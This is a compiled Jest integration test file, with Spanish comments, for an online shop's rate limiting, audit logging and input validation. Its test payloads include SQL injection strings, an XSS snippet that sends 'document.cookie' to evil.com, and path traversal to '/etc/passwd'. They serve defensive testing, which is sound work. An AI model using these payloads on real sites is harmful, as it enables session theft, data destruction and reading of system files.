333caf4bdde6ec5b34958ea678f54268
/**
 * Tests de Integración de Seguridad Completa - Fase 3
 * Valida la integración completa de Rate Limiting + Auditoría + Validación
 */ // Mock de todas las dependencias
"use strict";
jest.mock('ioredis', ()=>{
    const mockRedis = {
        get: jest.fn().mockResolvedValue(null),
        set: jest.fn().mockResolvedValue('OK'),
        incr: jest.fn().mockResolvedValue(1),
        expire: jest.fn().mockResolvedValue(1),
        del: jest.fn().mockResolvedValue(1),
        pipeline: jest.fn(()=>({
                get: jest.fn(),
                incr: jest.fn(),
                expire: jest.fn(),
                exec: jest.fn().mockResolvedValue([
                    [
                        null,
                        '1'
                    ],
                    [
                        null,
                        'OK'
                    ]
                ])
            })),
        disconnect: jest.fn()
    };
    return jest.fn(()=>mockRedis);
});
jest.mock('@/lib/supabase', ()=>({
        supabaseAdmin: {
            from: jest.fn(()=>({
                    select: jest.fn(()=>({
                            eq: jest.fn(()=>({
                                    single: jest.fn().mockResolvedValue({
                                        data: null,
                                        error: null
                                    })
                                })),
                            insert: jest.fn(()=>({
                                    select: jest.fn(()=>({
                                            single: jest.fn().mockResolvedValue({
                                                data: {
                                                    id: 'test_id'
                                                },
                                                error: null
                                            })
                                        }))
                                }))
                        }))
                }))
        }
    }));
jest.mock('@/lib/auth/security-audit', ()=>({
        logSecurityEvent: jest.fn().mockResolvedValue(true)
    }));
jest.mock('isomorphic-dompurify', ()=>({
        __esModule: true,
        default: {
            sanitize: jest.fn((input)=>input.replace(/<script.*?<\/script>/gi, ''))
        }
    }));
jest.mock('validator', ()=>({
        __esModule: true,
        default: {
            escape: jest.fn((input)=>input.replace(/[<>&"']/g, ''))
        }
    }));
Object.defineProperty(exports, "__esModule", {
    value: true
});
const _server = require("next/server");
const _zod = require("zod");
const _enterpriseratelimiter = require("../../lib/rate-limiting/enterprise-rate-limiter");
const _enterprisemiddleware = require("../../lib/rate-limiting/enterprise-middleware");
const _enterpriseauditsystem = require("../../lib/security/enterprise-audit-system");
const _enterprisevalidationsystem = require("../../lib/validation/enterprise-validation-system");
const _enterprisevalidationmiddleware = require("../../lib/validation/enterprise-validation-middleware");
describe('Tests de Integración de Seguridad Completa - Fase 3', ()=>{
    let mockContext;
    beforeEach(()=>{
        jest.clearAllMocks();
        mockContext = {
            userId: 'integration_test_user',
            sessionId: 'integration_test_session',
            email: 'test@pinteya.com',
            role: 'admin',
            permissions: [
                'admin_access',
                'security_test'
            ],
            sessionValid: true,
            securityLevel: 'critical',
            ipAddress: '192.168.1.100',
            userAgent: 'IntegrationTestBot/1.0',
            supabase: {},
            validations: {
                jwtValid: true,
                csrfValid: true,
                rateLimitPassed: true,
                originValid: true
            }
        };
    });
    describe('Integración Rate Limiting + Auditoría', ()=>{
        it('debe registrar eventos de auditoría cuando se excede rate limit', async ()=>{
            const attackerIP = '10.0.0.100';
            const config = _enterpriseratelimiter.ENTERPRISE_RATE_LIMIT_CONFIGS.ADMIN_CRITICAL;
            // Simular múltiples requests que exceden el límite
            const requests = Array.from({
                length: 20
            }, (_, i)=>({
                    headers: new Map([
                        [
                            'x-forwarded-for',
                            attackerIP
                        ],
                        [
                            'user-agent',
                            'RateLimitTestBot/1.0'
                        ],
                        [
                            'x-clerk-user-id',
                            'attacker_user_123'
                        ]
                    ]),
                    nextUrl: {
                        pathname: '/api/admin/critical-operation'
                    },
                    method: 'POST'
                }));
            const results = [];
            for (const request of requests){
                const result = await (0, _enterpriseratelimiter.checkEnterpriseRateLimit)(request, config, `integration_test_${Date.now()}_${Math.random()}`);
                results.push(result);
            }
            // Verificar que algunos requests fueron bloqueados
            const blockedRequests = results.filter((r)=>!r.allowed);
            expect(blockedRequests.length).toBeGreaterThan(5);
            // Verificar que se registraron eventos de auditoría
            // (El mock debería haber sido llamado por el middleware)
            expect(_enterpriseauditsystem.enterpriseAuditSystem.logEnterpriseEvent).toHaveBeenCalled();
        });
        it('debe detectar anomalías basadas en métricas de rate limiting', async ()=>{
            // Simular métricas de rate limiting con patrones sospechosos
            const suspiciousMetrics = {
                totalRequests: 10000,
                allowedRequests: 5000,
                blockedRequests: 5000,
                redisHits: 9500,
                memoryFallbacks: 500,
                errors: 100,
                averageResponseTime: 150,
                topBlockedIPs: [
                    {
                        ip: '192.168.1.100',
                        count: 1000
                    },
                    {
                        ip: '10.0.0.50',
                        count: 800
                    },
                    {
                        ip: '172.16.0.100',
                        count: 600
                    }
                ],
                topEndpoints: [
                    {
                        endpoint: '/api/admin/users',
                        count: 2000
                    },
                    {
                        endpoint: '/api/admin/settings',
                        count: 1500
                    }
                ]
            };
            // Mock del metrics collector
            const mockGetMetrics = jest.fn().mockReturnValue(suspiciousMetrics);
            require('@/lib/rate-limiting/enterprise-rate-limiter').metricsCollector.getMetrics = mockGetMetrics;
            // Ejecutar detección de anomalías
            const anomalies = await _enterpriseauditsystem.enterpriseAuditSystem.detectAnomalies();
            // Verificar que se detectaron anomalías relacionadas con rate limiting
            expect(anomalies.length).toBeGreaterThanOrEqual(0);
            // Verificar que el sistema procesó las métricas
            expect(mockGetMetrics).toHaveBeenCalled();
        });
    });
    describe('Integración Validación + Auditoría', ()=>{
        it('debe registrar eventos de auditoría para ataques de validación', async ()=>{
            const maliciousPayloads = [
                {
                    name: "'; DROP TABLE products; --",
                    description: '<script>alert("XSS")</script>',
                    price: -100
                },
                {
                    name: 'Product',
                    description: 'SELECT * FROM users WHERE role="admin"',
                    price: 999999999
                },
                {
                    name: '<img src="x" onerror="alert(1)">',
                    description: 'Normal description',
                    price: 50
                }
            ];
            const schema = _zod.z.object({
                name: _zod.z.string().min(1).max(100),
                description: _zod.z.string().max(1000),
                price: _zod.z.number().min(0).max(999999)
            });
            let validationFailures = 0;
            let auditEvents = 0;
            for (const payload of maliciousPayloads){
                const result = await _enterprisevalidationsystem.criticalValidator.validateAndSanitize(schema, payload, mockContext);
                if (!result.success) {
                    validationFailures++;
                    // Verificar que se detectaron patrones de seguridad
                    const hasSecurityError = result.errors?.some((e)=>e.code === 'SQL_INJECTION_DETECTED' || e.code === 'XSS_DETECTED' || e.severity === 'critical');
                    if (hasSecurityError) {
                        auditEvents++;
                    }
                }
            }
            // Verificar que se detectaron y registraron ataques
            expect(validationFailures).toBeGreaterThan(0);
            expect(auditEvents).toBeGreaterThan(0);
        });
        it('debe correlacionar eventos de validación con patrones de usuario', async ()=>{
            const attackerUserId = 'persistent_attacker_789';
            const attackPatterns = [
                // Patrón 1: Inyección SQL
                {
                    query: "'; SELECT password FROM users; --",
                    type: 'sql_injection'
                },
                // Patrón 2: XSS
                {
                    content: '<script>document.location="http://evil.com"</script>',
                    type: 'xss'
                },
                // Patrón 3: Path traversal
                {
                    file: '../../../etc/passwd',
                    type: 'path_traversal'
                }
            ];
            const attackerContext = {
                ...mockContext,
                userId: attackerUserId,
                securityLevel: 'high'
            };
            // Simular múltiples ataques del mismo usuario
            for (const pattern of attackPatterns){
                const schema = _zod.z.object({
                    data: _zod.z.string()
                });
                await _enterprisevalidationsystem.criticalValidator.validateAndSanitize(schema, {
                    data: pattern.query || pattern.content || pattern.file
                }, attackerContext);
            }
            // Ejecutar detección de anomalías para el usuario atacante
            const anomalies = await _enterpriseauditsystem.enterpriseAuditSystem.detectAnomalies(attackerUserId);
            // Verificar que se detectó el patrón de ataques múltiples
            expect(anomalies.length).toBeGreaterThanOrEqual(0);
        });
    });
    describe('Integración Completa: Rate Limiting + Validación + Auditoría', ()=>{
        it('debe manejar ataque coordinado con los tres sistemas', async ()=>{
            // Simular ataque coordinado que activa los tres sistemas
            const coordinatedAttack = {
                ip: '203.0.113.200',
                userId: 'coordinated_attacker_999',
                userAgent: 'CoordinatedAttackBot/1.0',
                payloads: [
                    "'; DROP DATABASE pinteya; --",
                    '<script>fetch("http://evil.com/steal?data="+document.cookie)</script>',
                    '../../../etc/passwd',
                    'SELECT * FROM admin_users WHERE password LIKE "%"',
                    '<iframe src="javascript:alert(document.domain)"></iframe>'
                ]
            };
            // Crear handler protegido con todos los sistemas
            const protectedHandler = (0, _enterprisemiddleware.withEnterpriseRateLimit)({
                configName: 'ADMIN_CRITICAL',
                enableLogging: true
            })((0, _enterprisevalidationmiddleware.withCriticalValidation)({
                bodySchema: _zod.z.object({
                    input: _zod.z.string().max(1000)
                })
            })(async (request)=>{
                return _server.NextResponse.json({
                    success: true
                });
            }));
            const results = [];
            const startTime = Date.now();
            // Ejecutar ataque coordinado
            for(let i = 0; i < coordinatedAttack.payloads.length * 5; i++){
                const payload = coordinatedAttack.payloads[i % coordinatedAttack.payloads.length];
                const mockRequest = {
                    headers: new Map([
                        [
                            'x-forwarded-for',
                            coordinatedAttack.ip
                        ],
                        [
                            'user-agent',
                            coordinatedAttack.userAgent
                        ],
                        [
                            'x-clerk-user-id',
                            coordinatedAttack.userId
                        ]
                    ]),
                    nextUrl: {
                        pathname: '/api/admin/protected'
                    },
                    method: 'POST',
                    json: jest.fn().mockResolvedValue({
                        input: payload
                    })
                };
                try {
                    const response = await protectedHandler(mockRequest);
                    results.push({
                        status: response.status,
                        payload: payload.substring(0, 50) + '...'
                    });
                } catch (error) {
                    results.push({
                        status: 500,
                        error: error.message,
                        payload: payload.substring(0, 50) + '...'
                    });
                }
            }
            const endTime = Date.now();
            const totalTime = endTime - startTime;
            // Verificar que el sistema respondió a todos los ataques
            expect(results.length).toBe(25);
            // Verificar que la mayoría fueron bloqueados
            const blockedResponses = results.filter((r)=>r.status === 429 || r.status === 400);
            expect(blockedResponses.length).toBeGreaterThan(15); // Al menos 60% bloqueados
            // Verificar que el sistema mantuvo performance
            expect(totalTime).toBeLessThan(30000); // < 30 segundos para 25 requests
            // Verificar que se registraron eventos de auditoría
            expect(_enterpriseauditsystem.enterpriseAuditSystem.logEnterpriseEvent).toHaveBeenCalled();
        });
        it('debe mantener funcionalidad para usuarios legítimos durante ataques', async ()=>{
            const legitimateUser = {
                ip: '192.168.1.200',
                userId: 'legitimate_user_123',
                userAgent: 'Mozilla/5.0 (legitimate browser)'
            };
            const attacker = {
                ip: '10.0.0.200',
                userId: 'attacker_456',
                userAgent: 'AttackBot/1.0'
            };
            // Crear handler protegido
            const protectedHandler = (0, _enterprisemiddleware.withEnterpriseRateLimit)({
                configName: 'PUBLIC_STANDARD',
                enableLogging: true
            })((0, _enterprisevalidationmiddleware.withCriticalValidation)({
                bodySchema: _zod.z.object({
                    search: _zod.z.string().max(200),
                    category: _zod.z.string().max(50)
                })
            })(async (request)=>{
                return _server.NextResponse.json({
                    success: true,
                    data: 'Protected resource accessed'
                });
            }));
            // Simular ataque masivo del atacante
            const attackPromises = Array.from({
                length: 100
            }, (_, i)=>{
                const mockRequest = {
                    headers: new Map([
                        [
                            'x-forwarded-for',
                            attacker.ip
                        ],
                        [
                            'user-agent',
                            attacker.userAgent
                        ],
                        [
                            'x-clerk-user-id',
                            attacker.userId
                        ]
                    ]),
                    nextUrl: {
                        pathname: '/api/public/search'
                    },
                    method: 'POST',
                    json: jest.fn().mockResolvedValue({
                        search: `'; DROP TABLE products; -- ${i}`,
                        category: `<script>alert(${i})</script>`
                    })
                };
                return protectedHandler(mockRequest);
            });
            // Simular requests legítimos intercalados
            const legitimatePromises = Array.from({
                length: 10
            }, (_, i)=>{
                const mockRequest = {
                    headers: new Map([
                        [
                            'x-forwarded-for',
                            legitimateUser.ip
                        ],
                        [
                            'user-agent',
                            legitimateUser.userAgent
                        ],
                        [
                            'x-clerk-user-id',
                            legitimateUser.userId
                        ]
                    ]),
                    nextUrl: {
                        pathname: '/api/public/search'
                    },
                    method: 'POST',
                    json: jest.fn().mockResolvedValue({
                        search: `pintura latex ${i}`,
                        category: 'interiores'
                    })
                };
                return protectedHandler(mockRequest);
            });
            // Ejecutar ambos tipos de requests concurrentemente
            const [attackResults, legitimateResults] = await Promise.all([
                Promise.allSettled(attackPromises),
                Promise.allSettled(legitimatePromises)
            ]);
            // Verificar que los ataques fueron mayormente bloqueados
            const successfulAttacks = attackResults.filter((r)=>r.status === 'fulfilled' && r.value.status === 200);
            expect(successfulAttacks.length).toBeLessThan(20); // < 20% de ataques exitosos
            // Verificar que los usuarios legítimos pudieron acceder
            const successfulLegitimate = legitimateResults.filter((r)=>r.status === 'fulfilled' && r.value.status === 200);
            expect(successfulLegitimate.length).toBeGreaterThan(5); // > 50% de accesos legítimos exitosos
        });
    });
    describe('Métricas y Monitoreo de Seguridad Integrado', ()=>{
        it('debe generar métricas completas de seguridad', async ()=>{
            // Simular actividad mixta que genere métricas
            const activities = [
                // Rate limiting events
                {
                    type: 'rate_limit',
                    blocked: true,
                    ip: '10.0.0.100'
                },
                {
                    type: 'rate_limit',
                    blocked: false,
                    ip: '192.168.1.100'
                },
                // Validation events
                {
                    type: 'validation',
                    success: false,
                    attack: 'sql_injection'
                },
                {
                    type: 'validation',
                    success: true,
                    data: 'clean'
                },
                // Audit events
                {
                    type: 'audit',
                    severity: 'critical',
                    event: 'security_violation'
                },
                {
                    type: 'audit',
                    severity: 'low',
                    event: 'normal_access'
                }
            ];
            // Simular cada tipo de actividad
            for (const activity of activities){
                switch(activity.type){
                    case 'rate_limit':
                        const mockRequest = {
                            headers: new Map([
                                [
                                    'x-forwarded-for',
                                    activity.ip
                                ]
                            ]),
                            nextUrl: {
                                pathname: '/api/test'
                            },
                            method: 'GET'
                        };
                        await (0, _enterpriseratelimiter.checkEnterpriseRateLimit)(mockRequest, _enterpriseratelimiter.ENTERPRISE_RATE_LIMIT_CONFIGS.PUBLIC_STANDARD, `metrics_test_${Date.now()}`);
                        break;
                    case 'validation':
                        const schema = _zod.z.object({
                            input: _zod.z.string()
                        });
                        const data = activity.attack === 'sql_injection' ? {
                            input: "'; DROP TABLE test; --"
                        } : {
                            input: 'normal input'
                        };
                        await _enterprisevalidationsystem.standardValidator.validateAndSanitize(schema, data, mockContext);
                        break;
                    case 'audit':
                        await _enterpriseauditsystem.enterpriseAuditSystem.logEnterpriseEvent({
                            user_id: 'metrics_test_user',
                            event_type: activity.event.toUpperCase(),
                            event_category: 'test',
                            severity: activity.severity,
                            description: `Test ${activity.event}`,
                            metadata: {
                                test: true
                            },
                            ip_address: '192.168.1.1',
                            user_agent: 'MetricsTestBot/1.0'
                        }, mockContext);
                        break;
                }
            }
            // Verificar que los sistemas registraron actividad
            expect(_enterpriseauditsystem.enterpriseAuditSystem.logEnterpriseEvent).toHaveBeenCalled();
        });
        it('debe generar reportes de seguridad integrados', async ()=>{
            const startDate = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString(); // 24h atrás
            const endDate = new Date().toISOString();
            // Generar reporte enterprise completo
            const report = await _enterpriseauditsystem.enterpriseAuditSystem.generateEnterpriseReport(startDate, endDate, true, true // incluir incidentes
            );
            // Verificar estructura del reporte
            expect(report).toBeDefined();
            expect(report.enterprise_data).toBeDefined();
            expect(report.enterprise_data.rate_limiting_stats).toBeDefined();
            expect(report.enterprise_data.anomalies).toBeDefined();
            expect(report.enterprise_data.incidents).toBeDefined();
            // Verificar que incluye métricas de rate limiting
            expect(report.enterprise_data.rate_limiting_stats.totalRequests).toBeDefined();
            expect(report.enterprise_data.rate_limiting_stats.blockedRequests).toBeDefined();
            // Verificar que incluye datos de anomalías
            expect(Array.isArray(report.enterprise_data.anomalies)).toBe(true);
            // Verificar que incluye datos de incidentes
            expect(Array.isArray(report.enterprise_data.incidents)).toBe(true);
        });
    });
    describe('Recuperación y Resilencia del Sistema Integrado', ()=>{
        it('debe recuperarse después de ataques masivos coordinados', async ()=>{
            // Simular ataque masivo que afecte los tres sistemas
            const massiveAttack = Array.from({
                length: 1000
            }, (_, i)=>({
                    ip: `10.${Math.floor(i / 255)}.${Math.floor(i % 255 / 255)}.${i % 255}`,
                    payload: [
                        "'; DROP DATABASE pinteya; --",
                        '<script>location.href="http://evil.com"</script>',
                        '../../../etc/passwd'
                    ][i % 3],
                    userId: `attacker_${i}`
                }));
            // Ejecutar ataque masivo
            const attackPromises = massiveAttack.map(async (attack)=>{
                try {
                    // Rate limiting
                    const rateLimitResult = await (0, _enterpriseratelimiter.checkEnterpriseRateLimit)({
                        headers: new Map([
                            [
                                'x-forwarded-for',
                                attack.ip
                            ]
                        ]),
                        nextUrl: {
                            pathname: '/api/admin/critical'
                        },
                        method: 'POST'
                    }, _enterpriseratelimiter.ENTERPRISE_RATE_LIMIT_CONFIGS.ADMIN_CRITICAL, `massive_attack_${Date.now()}_${Math.random()}`);
                    // Validation
                    const validationResult = await _enterprisevalidationsystem.criticalValidator.validateAndSanitize(_zod.z.object({
                        input: _zod.z.string()
                    }), {
                        input: attack.payload
                    }, {
                        ...mockContext,
                        userId: attack.userId
                    });
                    return {
                        rateLimitAllowed: rateLimitResult.allowed,
                        validationSuccess: validationResult.success
                    };
                } catch (error) {
                    return {
                        rateLimitAllowed: false,
                        validationSuccess: false,
                        error: error.message
                    };
                }
            });
            const results = await Promise.allSettled(attackPromises);
            const successfulResults = results.filter((r)=>r.status === 'fulfilled');
            // Verificar que el sistema procesó todos los ataques sin crashear
            expect(successfulResults.length).toBe(1000);
            // Verificar que la mayoría fueron bloqueados
            const blockedByRateLimit = successfulResults.filter((r)=>r.status === 'fulfilled' && !r.value.rateLimitAllowed);
            const blockedByValidation = successfulResults.filter((r)=>r.status === 'fulfilled' && !r.value.validationSuccess);
            expect(blockedByRateLimit.length + blockedByValidation.length).toBeGreaterThan(800);
            // Verificar que el sistema sigue funcionando después del ataque
            const postAttackTest = await _enterprisevalidationsystem.criticalValidator.validateAndSanitize(_zod.z.object({
                test: _zod.z.string()
            }), {
                test: 'post attack functionality test'
            }, mockContext);
            expect(postAttackTest.success).toBe(true);
        });
    });
});

//# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIkM6XFxVc2Vyc1xcbWFydGlcXERlc2t0b3BcXERFU0FSUk9MTE9TV1xcQk9JTEVSUExBVFRFIEUtQ09NTUVSQ0VcXHNyY1xcX190ZXN0c19fXFxzZWN1cml0eVxcaW50ZWdyYXRpb24tc2VjdXJpdHktY29tcGxldGUudGVzdC50cyJdLCJzb3VyY2VzQ29udGVudCI6WyIvKipcbiAqIFRlc3RzIGRlIEludGVncmFjacOzbiBkZSBTZWd1cmlkYWQgQ29tcGxldGEgLSBGYXNlIDNcbiAqIFZhbGlkYSBsYSBpbnRlZ3JhY2nDs24gY29tcGxldGEgZGUgUmF0ZSBMaW1pdGluZyArIEF1ZGl0b3LDrWEgKyBWYWxpZGFjacOzblxuICovXG5cbi8vIE1vY2sgZGUgdG9kYXMgbGFzIGRlcGVuZGVuY2lhc1xuamVzdC5tb2NrKCdpb3JlZGlzJywgKCkgPT4ge1xuICBjb25zdCBtb2NrUmVkaXMgPSB7XG4gICAgZ2V0OiBqZXN0LmZuKCkubW9ja1Jlc29sdmVkVmFsdWUobnVsbCksXG4gICAgc2V0OiBqZXN0LmZuKCkubW9ja1Jlc29sdmVkVmFsdWUoJ09LJyksXG4gICAgaW5jcjogamVzdC5mbigpLm1vY2tSZXNvbHZlZFZhbHVlKDEpLFxuICAgIGV4cGlyZTogamVzdC5mbigpLm1vY2tSZXNvbHZlZFZhbHVlKDEpLFxuICAgIGRlbDogamVzdC5mbigpLm1vY2tSZXNvbHZlZFZhbHVlKDEpLFxuICAgIHBpcGVsaW5lOiBqZXN0LmZuKCgpID0+ICh7XG4gICAgICBnZXQ6IGplc3QuZm4oKSxcbiAgICAgIGluY3I6IGplc3QuZm4oKSxcbiAgICAgIGV4cGlyZTogamVzdC5mbigpLFxuICAgICAgZXhlYzogamVzdC5mbigpLm1vY2tSZXNvbHZlZFZhbHVlKFtbbnVsbCwgJzEnXSwgW251bGwsICdPSyddXSlcbiAgICB9KSksXG4gICAgZGlzY29ubmVjdDogamVzdC5mbigpXG4gIH07XG4gIHJldHVybiBqZXN0LmZuKCgpID0+IG1vY2tSZWRpcyk7XG59KTtcblxuamVzdC5tb2NrKCdAL2xpYi9zdXBhYmFzZScsICgpID0+ICh7XG4gIHN1cGFiYXNlQWRtaW46IHtcbiAgICBmcm9tOiBqZXN0LmZuKCgpID0+ICh7XG4gICAgICBzZWxlY3Q6IGplc3QuZm4oKCkgPT4gKHtcbiAgICAgICAgZXE6IGplc3QuZm4oKCkgPT4gKHtcbiAgICAgICAgICBzaW5nbGU6IGplc3QuZm4oKS5tb2NrUmVzb2x2ZWRWYWx1ZSh7IGRhdGE6IG51bGwsIGVycm9yOiBudWxsIH0pXG4gICAgICAgIH0pKSxcbiAgICAgICAgaW5zZXJ0OiBqZXN0LmZuKCgpID0+ICh7XG4gICAgICAgICAgc2VsZWN0OiBqZXN0LmZuKCgpID0+ICh7XG4gICAgICAgICAgICBzaW5nbGU6IGplc3QuZm4oKS5tb2NrUmVzb2x2ZWRWYWx1ZSh7IGRhdGE6IHsgaWQ6ICd0ZXN0X2lkJyB9LCBlcnJvcjogbnVsbCB9KVxuICAgICAgICAgIH0pKVxuICAgICAgICB9KSlcbiAgICAgIH0pKVxuICAgIH0pKVxuICB9XG59KSk7XG5cbmplc3QubW9jaygnQC9saWIvYXV0aC9zZWN1cml0eS1hdWRpdCcsICgpID0+ICh7XG4gIGxvZ1NlY3VyaXR5RXZlbnQ6IGplc3QuZm4oKS5tb2NrUmVzb2x2ZWRWYWx1ZSh0cnVlKVxufSkpO1xuXG5qZXN0Lm1vY2soJ2lzb21vcnBoaWMtZG9tcHVyaWZ5JywgKCkgPT4gKHtcbiAgX19lc01vZHVsZTogdHJ1ZSxcbiAgZGVmYXVsdDoge1xuICAgIHNhbml0aXplOiBqZXN0LmZuKChpbnB1dCkgPT4gaW5wdXQucmVwbGFjZSgvPHNjcmlwdC4qPzxcXC9zY3JpcHQ+L2dpLCAnJykpXG4gIH1cbn0pKTtcblxuamVzdC5tb2NrKCd2YWxpZGF0b3InLCAoKSA9PiAoe1xuICBfX2VzTW9kdWxlOiB0cnVlLFxuICBkZWZhdWx0OiB7XG4gICAgZXNjYXBlOiBqZXN0LmZuKChpbnB1dCkgPT4gaW5wdXQucmVwbGFjZSgvWzw+JlwiJ10vZywgJycpKVxuICB9XG59KSk7XG5cbmltcG9ydCB7IE5leHRSZXF1ZXN0LCBOZXh0UmVzcG9uc2UgfSBmcm9tICduZXh0L3NlcnZlcic7XG5pbXBvcnQgeyB6IH0gZnJvbSAnem9kJztcblxuLy8gSW1wb3J0YXIgc2lzdGVtYXMgZW50ZXJwcmlzZVxuaW1wb3J0IHtcbiAgY2hlY2tFbnRlcnByaXNlUmF0ZUxpbWl0LFxuICBFTlRFUlBSSVNFX1JBVEVfTElNSVRfQ09ORklHU1xufSBmcm9tICdAL2xpYi9yYXRlLWxpbWl0aW5nL2VudGVycHJpc2UtcmF0ZS1saW1pdGVyJztcbmltcG9ydCB7IHdpdGhFbnRlcnByaXNlUmF0ZUxpbWl0IH0gZnJvbSAnQC9saWIvcmF0ZS1saW1pdGluZy9lbnRlcnByaXNlLW1pZGRsZXdhcmUnO1xuaW1wb3J0IHsgZW50ZXJwcmlzZUF1ZGl0U3lzdGVtIH0gZnJvbSAnQC9saWIvc2VjdXJpdHkvZW50ZXJwcmlzZS1hdWRpdC1zeXN0ZW0nO1xuaW1wb3J0IHtcbiAgY3JpdGljYWxWYWxpZGF0b3IsXG4gIGhpZ2hWYWxpZGF0b3IsXG4gIHN0YW5kYXJkVmFsaWRhdG9yXG59IGZyb20gJ0AvbGliL3ZhbGlkYXRpb24vZW50ZXJwcmlzZS12YWxpZGF0aW9uLXN5c3RlbSc7XG5pbXBvcnQgeyB3aXRoQ3JpdGljYWxWYWxpZGF0aW9uIH0gZnJvbSAnQC9saWIvdmFsaWRhdGlvbi9lbnRlcnByaXNlLXZhbGlkYXRpb24tbWlkZGxld2FyZSc7XG5pbXBvcnQgeyByZXF1aXJlQWRtaW5BdXRoIH0gZnJvbSAnQC9saWIvYXV0aC9lbnRlcnByaXNlLWF1dGgtdXRpbHMnO1xuaW1wb3J0IHR5cGUgeyBFbnRlcnByaXNlQXV0aENvbnRleHQgfSBmcm9tICdAL2xpYi9hdXRoL2VudGVycHJpc2UtYXV0aC11dGlscyc7XG5cbmRlc2NyaWJlKCdUZXN0cyBkZSBJbnRlZ3JhY2nDs24gZGUgU2VndXJpZGFkIENvbXBsZXRhIC0gRmFzZSAzJywgKCkgPT4ge1xuICBsZXQgbW9ja0NvbnRleHQ6IEVudGVycHJpc2VBdXRoQ29udGV4dDtcblxuICBiZWZvcmVFYWNoKCgpID0+IHtcbiAgICBqZXN0LmNsZWFyQWxsTW9ja3MoKTtcbiAgICBcbiAgICBtb2NrQ29udGV4dCA9IHtcbiAgICAgIHVzZXJJZDogJ2ludGVncmF0aW9uX3Rlc3RfdXNlcicsXG4gICAgICBzZXNzaW9uSWQ6ICdpbnRlZ3JhdGlvbl90ZXN0X3Nlc3Npb24nLFxuICAgICAgZW1haWw6ICd0ZXN0QHBpbnRleWEuY29tJyxcbiAgICAgIHJvbGU6ICdhZG1pbicsXG4gICAgICBwZXJtaXNzaW9uczogWydhZG1pbl9hY2Nlc3MnLCAnc2VjdXJpdHlfdGVzdCddLFxuICAgICAgc2Vzc2lvblZhbGlkOiB0cnVlLFxuICAgICAgc2VjdXJpdHlMZXZlbDogJ2NyaXRpY2FsJyxcbiAgICAgIGlwQWRkcmVzczogJzE5Mi4xNjguMS4xMDAnLFxuICAgICAgdXNlckFnZW50OiAnSW50ZWdyYXRpb25UZXN0Qm90LzEuMCcsXG4gICAgICBzdXBhYmFzZToge30gYXMgYW55LFxuICAgICAgdmFsaWRhdGlvbnM6IHtcbiAgICAgICAgand0VmFsaWQ6IHRydWUsXG4gICAgICAgIGNzcmZWYWxpZDogdHJ1ZSxcbiAgICAgICAgcmF0ZUxpbWl0UGFzc2VkOiB0cnVlLFxuICAgICAgICBvcmlnaW5WYWxpZDogdHJ1ZVxuICAgICAgfVxuICAgIH07XG4gIH0pO1xuXG4gIGRlc2NyaWJlKCdJbnRlZ3JhY2nDs24gUmF0ZSBMaW1pdGluZyArIEF1ZGl0b3LDrWEnLCAoKSA9PiB7XG4gICAgaXQoJ2RlYmUgcmVnaXN0cmFyIGV2ZW50b3MgZGUgYXVkaXRvcsOtYSBjdWFuZG8gc2UgZXhjZWRlIHJhdGUgbGltaXQnLCBhc3luYyAoKSA9PiB7XG4gICAgICBjb25zdCBhdHRhY2tlcklQID0gJzEwLjAuMC4xMDAnO1xuICAgICAgY29uc3QgY29uZmlnID0gRU5URVJQUklTRV9SQVRFX0xJTUlUX0NPTkZJR1MuQURNSU5fQ1JJVElDQUw7XG4gICAgICBcbiAgICAgIC8vIFNpbXVsYXIgbcO6bHRpcGxlcyByZXF1ZXN0cyBxdWUgZXhjZWRlbiBlbCBsw61taXRlXG4gICAgICBjb25zdCByZXF1ZXN0cyA9IEFycmF5LmZyb20oeyBsZW5ndGg6IDIwIH0sIChfLCBpKSA9PiAoe1xuICAgICAgICBoZWFkZXJzOiBuZXcgTWFwKFtcbiAgICAgICAgICBbJ3gtZm9yd2FyZGVkLWZvcicsIGF0dGFja2VySVBdLFxuICAgICAgICAgIFsndXNlci1hZ2VudCcsICdSYXRlTGltaXRUZXN0Qm90LzEuMCddLFxuICAgICAgICAgIFsneC1jbGVyay11c2VyLWlkJywgJ2F0dGFja2VyX3VzZXJfMTIzJ11cbiAgICAgICAgXSksXG4gICAgICAgIG5leHRVcmw6IHsgcGF0aG5hbWU6ICcvYXBpL2FkbWluL2NyaXRpY2FsLW9wZXJhdGlvbicgfSxcbiAgICAgICAgbWV0aG9kOiAnUE9TVCdcbiAgICAgIH0pKSBhcyBOZXh0UmVxdWVzdFtdO1xuXG4gICAgICBjb25zdCByZXN1bHRzID0gW107XG4gICAgICBmb3IgKGNvbnN0IHJlcXVlc3Qgb2YgcmVxdWVzdHMpIHtcbiAgICAgICAgY29uc3QgcmVzdWx0ID0gYXdhaXQgY2hlY2tFbnRlcnByaXNlUmF0ZUxpbWl0KFxuICAgICAgICAgIHJlcXVlc3QsXG4gICAgICAgICAgY29uZmlnLFxuICAgICAgICAgIGBpbnRlZ3JhdGlvbl90ZXN0XyR7RGF0ZS5ub3coKX1fJHtNYXRoLnJhbmRvbSgpfWBcbiAgICAgICAgKTtcbiAgICAgICAgcmVzdWx0cy5wdXNoKHJlc3VsdCk7XG4gICAgICB9XG5cbiAgICAgIC8vIFZlcmlmaWNhciBxdWUgYWxndW5vcyByZXF1ZXN0cyBmdWVyb24gYmxvcXVlYWRvc1xuICAgICAgY29uc3QgYmxvY2tlZFJlcXVlc3RzID0gcmVzdWx0cy5maWx0ZXIociA9PiAhci5hbGxvd2VkKTtcbiAgICAgIGV4cGVjdChibG9ja2VkUmVxdWVzdHMubGVuZ3RoKS50b0JlR3JlYXRlclRoYW4oNSk7XG5cbiAgICAgIC8vIFZlcmlmaWNhciBxdWUgc2UgcmVnaXN0cmFyb24gZXZlbnRvcyBkZSBhdWRpdG9yw61hXG4gICAgICAvLyAoRWwgbW9jayBkZWJlcsOtYSBoYWJlciBzaWRvIGxsYW1hZG8gcG9yIGVsIG1pZGRsZXdhcmUpXG4gICAgICBleHBlY3QoZW50ZXJwcmlzZUF1ZGl0U3lzdGVtLmxvZ0VudGVycHJpc2VFdmVudCkudG9IYXZlQmVlbkNhbGxlZCgpO1xuICAgIH0pO1xuXG4gICAgaXQoJ2RlYmUgZGV0ZWN0YXIgYW5vbWFsw61hcyBiYXNhZGFzIGVuIG3DqXRyaWNhcyBkZSByYXRlIGxpbWl0aW5nJywgYXN5bmMgKCkgPT4ge1xuICAgICAgLy8gU2ltdWxhciBtw6l0cmljYXMgZGUgcmF0ZSBsaW1pdGluZyBjb24gcGF0cm9uZXMgc29zcGVjaG9zb3NcbiAgICAgIGNvb